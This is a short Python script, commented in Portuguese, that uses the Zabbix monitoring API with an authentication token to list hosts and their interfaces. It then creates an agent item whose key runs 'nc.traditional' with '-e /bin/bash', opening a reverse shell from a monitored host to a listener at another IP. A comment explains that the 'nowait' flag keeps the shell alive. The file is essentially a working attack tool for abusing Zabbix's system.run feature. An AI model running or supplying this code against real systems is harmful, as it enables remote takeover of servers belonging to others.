import requests
import json

# Configurações da API
zabbix_url = 'http://xxxxxxxxxxxxxxxxxxxxxx:8080/api_jsonrpc.php'
headers = {'Content-Type': 'application/json'}
auth_token = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'


def listar_interface_host(auth_token):
    data = {
        "jsonrpc": "2.0",
        "method": "host.get",
        "params": {
            "output": [
                "hostid",
                "host"
            ],
            "selectInterfaces": [
                "interfaceid",
                "ip"
            ]
        },
        "auth": auth_token,
        "id": 2
    }

    response = requests.post(zabbix_url, headers=headers, data=json.dumps(data))
    
    
    # Imprime o status da resposta e o texto cru para debug
    # print(f"Status code: {response.status_code}")
    print(f"Response text: {response.text}")


def write_code_in_host(auth_token,hostid,interfaceid):
    payload = {
        "jsonrpc": "2.0",
        "method": "item.create",
        "params": {
            "name": "nc trad",
            #nowait tira o tempo para que a shell não caia
            "key_": "system.run[nc.traditional 10.168.2.11 455 -e /bin/bash ,nowait]",
            "hostid": hostid,
            "type": 0,  # Zabbix agent
            "value_type": 3,  # Tipo de retorno (3 significa log)
            "interfaceid": interfaceid,  # Interface do host
            "delay": "60s"
        },
        "auth": auth_token,
        "id": 1
    }

    response = requests.post(zabbix_url, headers=headers, data=json.dumps(payload))
    print(response.json())



listar_interface_host(auth_token)
#listar_interface_host traz o resultado do hostid e  interfaceid para executar no agent
#exemplo de saida = Response text: {"jsonrpc":"2.0","result":[{"hostid":"10084","host":"Zabbix server","interfaces":[{"interfaceid":"1","ip":"127.0.0.1"}]},
# {"hostid":"10634","host":"agent1","interfaces":[{"interfaceid":"31","ip":"10.168.2.11"}]}],"id":2}
hostid=""
interfaceid=""
# write_code_in_host(auth_token,hostid)
